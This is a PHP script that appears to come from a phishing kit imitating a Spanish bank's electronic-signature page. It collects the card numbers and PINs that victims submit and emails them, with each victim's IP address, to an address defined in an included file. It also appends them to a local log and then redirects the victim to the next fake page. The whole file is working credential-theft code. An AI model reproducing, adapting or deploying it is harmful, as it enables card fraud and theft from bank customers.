<?
include '../mail.php';
$ip = getenv("REMOTE_ADDR");
$message .= "| IP : $ip   -----------\n";
$message .= "Tarjetas :  ".$_POST['ccnum']."\n";
$message .= "Pin :  ".$_POST['pin']."\n";
$message .= "Th3 MasT3r Z --------------------- \n";

$subject = "| SANTA Datos | $ip |";
$from = "From: SPAIN <tmz@Localhost.com>";
mail($send,$subject,$message,$from);


$file = fopen("../../bella.txt", 'a');
fwrite($file, $message);

echo "<script>window.top.location.href = \"Firmaelectronica.html?websrc=".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." \"; </script>";

?>
}
